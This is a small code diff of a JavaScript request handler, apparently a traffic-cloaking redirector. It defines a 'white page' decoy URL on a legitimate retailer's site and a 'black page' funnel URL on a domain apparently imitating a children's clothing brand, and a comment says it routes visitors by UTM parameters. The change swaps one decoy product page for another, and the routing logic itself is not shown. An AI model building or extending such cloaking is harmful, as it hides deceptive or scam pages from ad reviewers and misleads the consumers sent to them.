@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.specsavers.co.uk/glasses/entry-05?sku=30880627";
+    const whitePageURL = "https://www.clinique.co.uk/product/1673/8279/skin-care/cleansers-makeup-removers/liquid-facial-soap";
     const blackPageURL = "https://gymboreeusk.myfunnelish.com/Stimulus";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
